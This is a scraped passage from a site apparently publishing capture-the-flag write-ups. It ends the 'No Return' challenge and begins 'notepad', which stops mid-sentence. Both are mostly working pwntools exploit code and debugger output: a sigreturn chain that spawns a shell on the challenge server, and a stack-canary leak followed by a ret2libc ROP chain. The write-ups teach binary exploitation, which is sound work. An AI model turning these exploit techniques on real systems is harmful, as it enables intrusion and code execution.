PIE: No PIE (0x400000) [+] Starting local process './no-return': pid 1015028 [*] Stack address leak: 0x7ffcd2a8edb0 [*] Stack address leak: 0x7ffcd2a8edb8 [*] Stack address leak: 0x7ffcd2a8edc0 [*] Stack address leak: 0x7ffcd2a8edc8 [*] Stack address leak: 0x7ffcd2a8edd0 [*] Stack address leak: 0x7ffcd2a8edd8 [*] Stack address leak: 0x7ffcd2a8ede0 [*] Stack address leak: 0x7ffcd2a8ede8 [*] Stopped process './no-return' (pid 1015028)  Notice that the stack address leak increases by 8 on each iteration. The fact is that with this procedure, we are having control over 8 bytes on the stack that will remain there until the program is terminated. We can tweak a bit the script to prove it in GDB.\ndef main(): p = get_process() offset = 176 gdb.attach(p, gdbscript='break *0x40109f') for i in range(8): junk = chr(ord('A') + i).encode() * offset leak = u64(p.recv(8).ljust(8, b'\\0')) log.info(f'Stack address leak: {hex(leak)}') payload = junk payload += p64(0x40109b) payload += p64(0x40106d) p.send(payload)  The script uses different characters as junk on each iteration. We can run it and continue in GDB a few times. Then we can show the stack:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In '[stack]'(0x7ffc34121000-0x7ffc34142000), permission=rw- 0x7ffc34140fa8 - 0x7ffc34140fdf → \"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]\" 0x7ffc34140fac - 0x7ffc34140fe3 → \"AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]\" gef➤ x/100x 0x7ffc34140fa8 0x7ffc34140fa8: 0x41414141 0x41414141 0x42424242 0x42424242 0x7ffc34140fb8: 0x43434343 0x43434343 0x44444444 0x44444444 0x7ffc34140fc8: 0x45454545 0x45454545 0x46464646 0x46464646 0x7ffc34140fd8: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34140fe8: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34140ff8: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141008: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141018: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141028: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141038: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141048: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141058: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141068: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141078: 0x47474747 0x47474747 0x47474747 0x47474747 0x7ffc34141088: 0x0040109b 0x00000000 0x0040106d 0x00000000 0x7ffc34141098: 0x34141b1b 0x00007ffc 0x34141b26 0x00007ffc 0x7ffc341410a8: 0x34141b37 0x00007ffc 0x34141b61 0x00007ffc 0x7ffc341410b8: 0x34141b72 0x00007ffc 0x34141b89 0x00007ffc 0x7ffc341410c8: 0x34141ba7 0x00007ffc 0x34141bc2 0x00007ffc 0x7ffc341410d8: 0x34141bda 0x00007ffc 0x34141bee 0x00007ffc 0x7ffc341410e8: 0x34141c05 0x00007ffc 0x34141c1a 0x00007ffc 0x7ffc341410f8: 0x34141c33 0x00007ffc 0x34141c47 0x00007ffc 0x7ffc34141108: 0x34141c55 0x00007ffc 0x34141c81 0x00007ffc 0x7ffc34141118: 0x34141caa 0x00007ffc 0x34141cb9 0x00007ffc 0x7ffc34141128: 0x34141d00 0x00007ffc 0x34141dc4 0x00007ffc  Alright, we found a way to increase the stack space and control what we are storing there.\nCrafting the payload To continue with exploitation, I will disable ASLR locally and use hard-coded addresses to implement the strategy explained above.\n# echo 0 | tee /proc/sys/kernel/randomize_va_space 0  If we execute the same Python script, we will see fix addresses because ASLR is disabled:\ngef➤ grep AAAA [+] Searching 'AAAA' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe6e8 - 0x7fffffffe71f → \"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGG[...]\" 0x7fffffffe6ec - 0x7fffffffe723 → \"AAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGG[...]\" gef➤ x/100x 0x7fffffffe6e8 0x7fffffffe6e8: 0x41414141 0x41414141 0x42424242 0x42424242 0x7fffffffe6f8: 0x43434343 0x43434343 0x44444444 0x44444444 0x7fffffffe708: 0x45454545 0x45454545 0x46464646 0x46464646 0x7fffffffe718: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe728: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe738: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe748: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe758: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe768: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe778: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe788: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe798: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe7a8: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe7b8: 0x47474747 0x47474747 0x47474747 0x47474747 0x7fffffffe7c8: 0x0040109b 0x00000000 0x0040106d 0x00000000 0x7fffffffe7d8: 0xffffeb1b 0x00007fff 0xffffeb26 0x00007fff 0x7fffffffe7e8: 0xffffeb37 0x00007fff 0xffffeb61 0x00007fff 0x7fffffffe7f8: 0xffffeb72 0x00007fff 0xffffeb89 0x00007fff 0x7fffffffe808: 0xffffeba7 0x00007fff 0xffffebc2 0x00007fff 0x7fffffffe818: 0xffffebda 0x00007fff 0xffffebee 0x00007fff 0x7fffffffe828: 0xffffec05 0x00007fff 0xffffec1a 0x00007fff 0x7fffffffe838: 0xffffec33 0x00007fff 0xffffec47 0x00007fff 0x7fffffffe848: 0xffffec55 0x00007fff 0xffffec81 0x00007fff 0x7fffffffe858: 0xffffecaa 0x00007fff 0xffffecb9 0x00007fff 0x7fffffffe868: 0xffffed00 0x00007fff 0xffffedc4 0x00007fff  And these were the leaks:\n$ python3 solve.py [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './no-return': pid 1031120 [+] Waiting for debugger: Done [*] Stack address leak: 0x7fffffffe7a0 [*] Stack address leak: 0x7fffffffe7a8 [*] Stack address leak: 0x7fffffffe7b0 [*] Stack address leak: 0x7fffffffe7b8 [*] Stack address leak: 0x7fffffffe7c0 [*] Stack address leak: 0x7fffffffe7c8 [*] Stack address leak: 0x7fffffffe7d0 [*] Stack address leak: 0x7fffffffe7d8 [*] Stopped process './no-return' (pid 1031120)  Alright, now let\u0026rsquo;s build the payload to be executed. First of all, once we end the loop, we will jump to 0x401000, to set the value of some registers:\n401000: 5c pop rsp 401001: 5f pop rdi 401002: 5e pop rsi 401003: 5d pop rbp 401004: 5a pop rdx 401005: 59 pop rcx 401006: 5b pop rbx 401007: 48 31 c0 xor rax,rax 40100a: ff 67 01 jmp QWORD PTR [rdi+0x1]   $rsp must be set to the address where the value for $rdi is stored Dummy values for $rsi and $rbp $rdi must contain an address (minus one) that contains the address of the next instruction to execute (the gadget at 0x40105a) $rdx must have 0xf (because the gadget will move this value to $rax, so that we can execute sys_rt_sigreturn) $rcx will have the address of an address that points to a syscall instruction (0x401082 or 0x401099) Dummy value for $rbx  Then, the program will jump to the address stored in the address pointed to by $rdi+0x1, which is the gadget:\n0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx]  Here, the value of $rax will change to 0xf, and the jump will bring the program to execute sys_rt_sigreturn. Thus, after the previous data, we will put the frame that will be restored to the registers. In pwntools there is a class called SigreturnFrame that helps with this technique.\nOnce the registers are set as explained before, the program will spawn a shell.\nFor the moment, I will use recognizable values to identify the addresses that must replace those dummy values:\ndef send_data(p, data: bytes, offset: int) -\u0026gt; int: junk = data * (offset // 8) leak = u64(p.recv(8).ljust(8, b'\\0')) payload = junk payload += p64(0x40109b) payload += p64(0x40106d) p.send(payload) return leak def main(): p = get_process() offset = 176 data = b'/bin/sh\\0' data += p64(0x40105a) data += p64(0x401099) data += p64(0xacdcacdc) # rdi data += p64(0) # rsi data += p64(0) # rbp data += p64(0xf) # rdx data += p64(0xcafebabe) # rcx data += p64(0) # rbx frame = SigreturnFrame() frame.rax = 0x3b frame.rip = 0x401099 frame.rdi = 0xf00df00d frame.rsi = 0 frame.rdx = 0 data += bytes(frame) gdb.attach(p, gdbscript='break *0x401000') for i in range(8, len(data), 8): send_data(p, data[i : i + 8], offset) payload = b'A' * offset payload += p64(0x401000) payload += p64(0xdeadbeef) # rsp p.send(payload) p.recv() p.interactive()  Tweaking the payload I\u0026rsquo;ll attach GDB to the process and set a breakpoint at 0x401000 (at pop rsp). We can run it until we reach this point:\ngef➤ continue Continuing. Breakpoint 1, 0x0000000000401000 in ?? ()  We see the dummy value 0xdeadbeef that will go to $rsp:\ngef➤ x/i $rip =\u0026gt; 0x401000: pop rsp gef➤ x/4gx $rsp 0x7fffffffe8e0: 0x00000000deadbeef 0x00007fffffffef46 0x7fffffffe8f0: 0x00007fffffffef5b 0x00007fffffffefaa  We need to change 0xdeadbeef to the address that stores value that needs to go in $rdi, which is the dummy 0xacdcacdc:\ngef➤ grep 0xacdcacdc [+] Searching '\\xdc\\xac\\xdc\\xac' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe700 - 0x7fffffffe710 → \"\\xdc\\xac\\xdc\\xac[...]\"  So 0xdeadbeef -\u0026gt; 0x7fffffffe700. We can continue:\ngef➤ si 0x0000000000401001 in ?? ()  And set the new value of $rsp:\ngef➤ set $rsp = 0x7fffffffe700 gef➤ x/i $rip =\u0026gt; 0x401001: pop rdi gef➤ x/4gx $rsp 0x7fffffffe700: 0x00000000acdcacdc 0x0000000000000000 0x7fffffffe710: 0x0000000000000000 0x000000000000000f gef➤ si 0x0000000000401002 in ?? ()  Now let\u0026rsquo;s find the address where 0x40105a is stored:\ngef➤ p/x $rdi $1 = 0xacdcacdc gef➤ grep 0x40105a [+] Searching '\\x5a\\x10\\x40' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe6f0 - 0x7fffffffe6fc → \"\\x5a\\x10\\x40[...]\"  So 0xacdcacdc -\u0026gt; (0x7fffffffe6f0 - 1), so that jmp QWORD PTR [rdi+0x1] goes to 0x40105a.\ngef➤ set $rdi = 0x7fffffffe6f0 - 1  A few steps later, we must change the value for $rcx, which is set to 0xcafebabe, and should be 0x401099:\ngef➤ p/x $rcx $2 = 0xcafebabe gef➤ grep 0x401099 [+] Searching '\\x99\\x10\\x40' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe6f8 - 0x7fffffffe704 → \"\\x99\\x10\\x40[...]\" 0x7fffffffe7d8 - 0x7fffffffe7e4 → \"\\x99\\x10\\x40[...]\"  So 0xcafebabe -\u0026gt; 0x7fffffffe6f8:\ngef➤ set $rcx = 0x7fffffffe6f8  Eventually, we will jump to the gadget and then execute sys_rt_sigreturn:\ngef➤ x/i $rip =\u0026gt; 0x401099: syscall gef➤ p/x $rax $3 = 0xf gef➤ x/40gx $rsp 0x7fffffffe730: 0x0000000000000000 0x0000000000000000 0x7fffffffe740: 0x0000000000000000 0x0000000000000000 0x7fffffffe750: 0x0000000000000000 0x0000000000000000 0x7fffffffe760: 0x0000000000000000 0x0000000000000000 0x7fffffffe770: 0x0000000000000000 0x0000000000000000 0x7fffffffe780: 0x0000000000000000 0x0000000000000000 0x7fffffffe790: 0x0000000000000000 0x00000000f00df00d 0x7fffffffe7a0: 0x0000000000000000 0x0000000000000000 0x7fffffffe7b0: 0x0000000000000000 0x0000000000000000 0x7fffffffe7c0: 0x000000000000003b 0x0000000000000000 0x7fffffffe7d0: 0x0000000000000000 0x0000000000401099 0x7fffffffe7e0: 0x0000000000000000 0x0000000000000033 0x7fffffffe7f0: 0x0000000000000000 0x0000000000000000 0x7fffffffe800: 0x0000000000000000 0x0000000000000000 0x7fffffffe810: 0x0000000000000000 0x0000000000000000 0x7fffffffe820: 0x0000000000000000 0x4141414141414141 0x7fffffffe830: 0x4141414141414141 0x4141414141414141 0x7fffffffe840: 0x4141414141414141 0x4141414141414141 0x7fffffffe850: 0x4141414141414141 0x4141414141414141 0x7fffffffe860: 0x4141414141414141 0x4141414141414141  Stepping again, the frame will be restored to the registers:\ngef➤ si 0x0000000000401099 in ?? ()  gef➤ info registers rax 0x3b 0x3b rbx 0x0 0x0 rcx 0x0 0x0 rdx 0x0 0x0 rsi 0x0 0x0 rdi 0xf00df00d 0xf00df00d rbp 0x0 0x0 rsp 0x0 0x0 ... rip 0x401099 0x401099 ...  And there is the last dummy value (0xf00df00d), which must be the address where \u0026quot;/bin/sh\u0026quot; is stored:\ngef➤ grep /bin/sh [+] Searching '/bin/sh' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe6e8 - 0x7fffffffe6ef → \"/bin/sh\"  So 0xf00df00d -\u0026gt; 0x7fffffffe6e8. If we change this value and continue, we will have a shell:\ngef➤ set $rdi = 0x7fffffffe6e8 gef➤ continue Continuing. process 1145760 is executing new program: /usr/bin/dash Warning: Cannot insert breakpoint 1. Cannot access memory at address 0x401000  Alright, we can modify the dummy values and see if the exploit works:\ndef main(): p = get_process() offset = 176 data = b'/bin/sh\\0' data += p64(0x40105a) data += p64(0x401099) data += p64(0x7fffffffe6f0- 1) # rdi data += p64(0) # rsi data += p64(0) # rbp data += p64(0xf) # rdx data += p64(0x7fffffffe6f8) # rcx data += p64(0) # rbx frame = SigreturnFrame() frame.rax = 0x3b frame.rip = 0x401099 frame.rdi = 0x7fffffffe6e8 frame.rsi = 0 frame.rdx = 0 data += bytes(frame) for i in range(8, len(data), 8): send_data(p, data[i : i + 8], offset) payload = b'A' * offset payload += p64(0x401000) payload += p64(0x7fffffffe700) # rsp p.send(payload) p.recv() p.interactive()  And it works:\n$ python3 solve.py [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './no-return': pid 1192591 [*] Switching to interactive mode $ ls no-return solve.py  Enabling ASLR Now we need to turn on ASLR and bypass it. This can be done with the stack address leaks we have. Before enabling ASLR, let\u0026rsquo;s compute the addresses as an offset to the first leak. For that, I will take the first iteration outside the loop:\ndef main(): p = get_process() offset = 176 data = b'/bin/sh\\0' stack_leak = send_data(p, data, offset) log.info(f'Stack address leak: {hex(stack_leak)}') data += p64(0x40105a) data += p64(0x401099) data += p64(0x7fffffffe6f0 - 1) # rdi data += p64(0) # rsi data += p64(0) # rbp data += p64(0xf) # rdx data += p64(0x7fffffffe6f8) # rcx data += p64(0) # rbx frame = SigreturnFrame() frame.rax = 0x3b frame.rip = 0x401099 frame.rdi = 0x7fffffffe6e8 frame.rsi = 0 frame.rdx = 0 data += bytes(frame) for i in range(8, len(data), 8): send_data(p, data[i : i + 8], offset) payload = b'A' * offset payload += p64(0x401000) payload += p64(0x7fffffffe700) # rsp p.send(payload) p.recv() p.interactive()  $ python3 solve.py [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './no-return': pid 1194870 [*] Stack address leak: 0x7fffffffe7a0 [*] Switching to interactive mode $ ls no-return solve.py  These are the offsets to this stack leak:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; stack_leak = 0x7fffffffe7a0 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6f0 - stack_leak -176 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6f8 - stack_leak -168 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6e8 - stack_leak -184 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe700 - stack_leak -160  We can even reference them to offset, which is 176:\n\u0026gt;\u0026gt;\u0026gt; offset = 176 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6f0 - (stack_leak - offset) 0 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6f8 - (stack_leak - offset) 8 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe6e8 - (stack_leak - offset) -8 \u0026gt;\u0026gt;\u0026gt; 0x7fffffffe700 - (stack_leak - offset) 16  So this is the updated exploit:\ndef main(): p = get_process() offset = 176 data = b'/bin/sh\\0' stack_leak = send_data(p, data, offset) log.info(f'Stack address leak: {hex(stack_leak)}') data += p64(0x40105a) data += p64(0x401099) data += p64(stack_leak - offset - 1) # rdi data += p64(0) # rsi data += p64(0) # rbp data += p64(0xf) # rdx data += p64(stack_leak - offset + 8) # rcx data += p64(0) # rbx frame = SigreturnFrame() frame.rax = 0x3b frame.rip = 0x401099 frame.rdi = stack_leak - offset - 8 frame.rsi = 0 frame.rdx = 0 data += bytes(frame) for i in range(8, len(data), 8): send_data(p, data[i : i + 8], offset) payload = b'A' * offset payload += p64(0x401000) payload += p64(stack_leak - offset + 16) # rsp p.send(payload) p.recv() p.interactive()  We can run it locally with ASLR enabled:\n# echo 2 | tee /proc/sys/kernel/randomize_va_space 2  $ python3 solve.py [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './no-return': pid 891062 [*] Stack address leak: 0x7ffd133ea7e0 [*] Switching to interactive mode $ ls no-return solve.py  Flag Alright, now let\u0026rsquo;s run it on server side:\n$ python3 solve.py 157.245.46.136:31468 [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to 157.245.46.136 on port 31468: Done [*] Stack address leak: 0x7ffeff950900 [*] Switching to interactive mode $ ls 11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt no-return run_challenge.sh $ cat 11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt HTB{y0uv3_35c4p3d_7h3_v01d_0f_n0_r37urn}  The full exploit code is here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/no-return/","section":"ctf","summary":"64-bit static binary. JOP. sys_rt_sigreturn and sys_execve","time":20,"title":"No Return"},{"contents":"We are given a 64-bit binary called notepad:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  If we use Ghidra to extract the decompiled C source code, we see the main function:\nvoidmain() { setbuf(stdout, (char*) 0x0); do{ notepad(); } while(true); }  Basically, it runs notepad infinitely:\nvoidnotepad() { longin_FS_OFFSET; charoption; inti; undefined notes[136]; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); for(i =0; i \u0026lt;128; i =i +1) { notes[i] =0; } puts(\"Welcome to Notepad as a Service!\"); while(true) { while(true) { while(true) { puts(\"Menu:\"); puts(\"1) View note\"); puts(\"2) Edit note\"); puts(\"3) Quit and make new note\\n\"); printf(\"\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%c%c\", \u0026amp;option, \u0026amp;dead); if(option !='1') break; view(notes); } if(option !='2') break; edit(notes); } if(option =='3') break; puts(\"Not a valid choice!\"); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  The view function is pretty simple:\nvoidview(undefined8 param_1) { printf(\"Your note is %s\\n\", param_1); return; }  And the edit function is quite interesting:\nvoidedit(longparam_1) { intinput_char; inti; intlimit;  puts(\"What index do you want to edit it at (0-127)?\"); printf(\"\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%u%c\", \u0026amp;i, \u0026amp;dead); if(i \u0026lt;128) { printf(\"Enter your changes:\\n\u0026gt;\u0026gt;\u0026gt; \"); limit =0; while(true) { input_char =getchar(); if(((char) input_char =='\\n') ||(0x7e\u0026lt;limit)) break; *(char*) (i +param_1) =(char) input_char; limit =limit +1; i =i +1; } } else{ printf(\"That\\'s not a valid index!\"); } return; }  Here we have a way of writing up to 0x7e (126) characters different to \\n at a position of notes (char array of 136 elements).\nSo, imagine if we use index 127 and enter a large amount of data:\n$ ./notepad Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 3 *** stack smashing detected ***: terminated zsh: abort (core dumped) ./notepad  There it is. We have a Buffer Overflow vulnerability and we also see the canary protection.\nLet\u0026rsquo;s use GDB to see where is the stack canary placed with respect to our note input:\n$ gdb -q notepad Reading symbols from notepad... (No debugging symbols found in notepad) gef➤ run Starting program: ./notepad Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; ABCDEFGH Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7ecefd2 in __GI___libc_read (fd=0x0, buf=0x4052a0, nbytes=0x400) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  gef➤ grep ABCDEFGH [+] Searching 'ABCDEFGH' in memory [+] In '[heap]'(0x405000-0x426000), permission=rw- 0x4052a0 - 0x4052aa → \"ABCDEFGH\\n\" [+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5b000-0x7ffff7fa9000), permission=r-- 0x7ffff7f69ea1 - 0x7ffff7f69ed8 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqr[...]\" 0x7ffff7f7902c - 0x7ffff7f79063 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx[...]\" 0x7ffff7f790ca - 0x7ffff7f790e4 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" 0x7ffff7f7911a - 0x7ffff7f7913e → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe63f - 0x7fffffffe647 → \"ABCDEFGH\" gef➤ x/10gx 0x7fffffffe630 0x7fffffffe630: 0x0000000000000000 0x4100000000000000 0x7fffffffe640: 0x0048474645444342 0x017050fc6fd30b00 0x7fffffffe650: 0x00007fffffffe660 0x00000000004013b1 0x7fffffffe660: 0x0000000000000000 0x00007ffff7de5083 0x7fffffffe670: 0x00007ffff7ffc620 0x00007fffffffe758  The stack canary value is 0x017050fc6fd30b00, because the next value is the saved $rbp (0x7fffffffe660) and the following one is the saved return address (0x4013b1). In order to bypass this protection, we must leak it. One way of doing this is adding two more bytes to the note and printing its value with view (the need of two more bytes is to avoid the first null byte of the stack canary value):\ngef➤ continue Continuing. 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; ABCDEFGHIJ Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 1 Your note is Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt;  However, we need to fill the other notes. At the moment, all notes have null bytes. That\u0026rsquo;s why we see nothing, because null bytes terminate strings in C.\nHaving said this, let\u0026rsquo;s start the exploit to leak the stack canary value:\n#!/usr/bin/env python3 frompwnimport* context.binary='notepad' elf=context.binary defget_process(): iflen(sys.argv) ==1: returnelf.process() host, port=sys.argv[1], sys.argv[2] returnremote(host, int(port)) defmain(): p=get_process() p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'0') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'A'*127) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'B'*10) p.interactive() if__name__=='__main__': main()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 60556 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $ 1 Your note is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBI8\\x88\\x81%J\\xe9\\xe0\\xe8\\x8a\\x13\\x7f Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  And there we have the stack canary, we can add this functionality in the exploit:\np.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'1') note=p.recvline() canary=u64(b'\\0'+note.split(b'B'*10)[1][:7]) log.info(f'Canary: {hex(canary)}') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 114719 [*] Canary: 0x3a915786143fd700 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  In order to continue with the exploitation process, we must perform a Ret2Libc attack, because NX is enabled in the binary. Hence, we must use Return Oriented Programming (ROP) to execute arbitrary code once we overwrite the saved return address.\nMoreover, we need to leak a function inside Glibc in order to bypass ASLR, which is very likely to be enabled in the remote system. For this purpose, we need to use puts to print the contents of a certain Glibc function at the Global Offset Table (GOT), because it will leak the corresponding value at the Procedure Linkage Table (PLT) with the exact address of that function in Glibc at runtime.\nHence, we need a gadget pop rdi; ret in order to enter the GOT address of a function (for example, the same puts function) into $rdi (first argument). Then call puts using the PLT and finally call main to continue with the execution of the program.\nAll these values can be obtained with the following commands:\n$ readelf -s notepad | grep main 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.2.5 (2) 57: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2 71: 000000000040138f 36 FUNC GLOBAL DEFAULT 14 main $ ROPgadget --binary notepad | grep 'pop rdi ; ret' 0x000000000040141b : pop rdi ; ret $ objdump -d notepad | grep puts 0000000000401030 \u0026lt;puts@plt\u0026gt;: 401030: ff 25 e2 2f 00 00 jmpq *0x2fe2(%rip) # 404018 \u0026lt;puts@GLIBC_2.2.5\u0026gt; 4011cf: e8 5c fe ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012b9: e8 72 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012c5: e8 66 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012d1: e8 5a fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012dd: e8 4e fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012e9: e8 42 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 40136e: e8 bd fc ff ff callq 401030 \u0026lt;puts@plt\u0026gt;  Nevertheless, pwntools provides useful attributes to access these values, so that we don\u0026rsquo;t need to hard-code them. The ROP chain must include the stack canary value, to leave it unchanged (thus bypassing the protection) and enter a dummy $rbp value, like 0.\npop_rdi_ret_addr=0x40141b payload=b'B'*9 payload+=p64(canary) payload+=p64(0) payload+=p64(pop_rdi_ret_addr) payload+=p64(elf.got.puts) payload+=p64(elf.plt.puts) payload+=p64(elf.sym.main) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', payload) p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 125758 [*] Canary: 0xdcf713bcdc856e00 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $ 3 \\xc4\\x82\\xa7\\x7f Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  And there is the real function of puts at runtime. Let\u0026rsquo;s grab it and format it as a hexadecimal number:\np.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'3') puts_addr=u64(p.recvline().strip(b'\\n').ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 128245 [*] Canary: 0x4d5be7ce3e22000 [*] Leaked puts() address: 0x7fefe990a420 [*] Switching to interactive mode Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Alright, we are in main again, so we need to fill the notes one more time. Now, we can get the offset of system 